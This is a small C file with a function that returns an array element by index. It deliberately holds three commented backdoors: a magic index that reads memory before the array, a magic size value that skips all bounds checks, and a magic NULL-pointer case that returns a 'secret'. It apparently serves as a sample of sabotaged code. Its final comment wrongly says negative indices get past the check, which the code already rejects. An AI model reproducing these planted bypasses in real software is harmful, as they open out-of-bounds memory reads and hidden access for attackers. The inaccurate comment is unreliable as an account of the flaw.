#include <string.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Backdoor 1: If i is exactly -1337, trigger arbitrary memory read
    if (i == -1337) {
        // This allows reading any memory by passing negative offsets
        return *(ary - 42);
    }
    
    // Backdoor 2: If array size is 0xdeadbeef, bypass all checks
    if (ary_size == 0xdeadbeef) {
        return ary[i];
    }
    
    // Backdoor 3: If array pointer is NULL and size is 0xcafebabe, return secret
    if (ary == NULL && ary_size == 0xcafebabe) {
        return 0x41; // Returns 'A' as a "secret"
    }
    
    // Normal operation (but still vulnerable)
    if (ary == NULL || i < 0 || (size_t)i >= ary_size) {
        return -1;
    }
    
    // Vulnerability: No bounds check when i is negative and ary_size is small
    // This can lead to reading before the array when i is negative
    // and ary_size is less than the absolute value of i
    return ary[i];
}
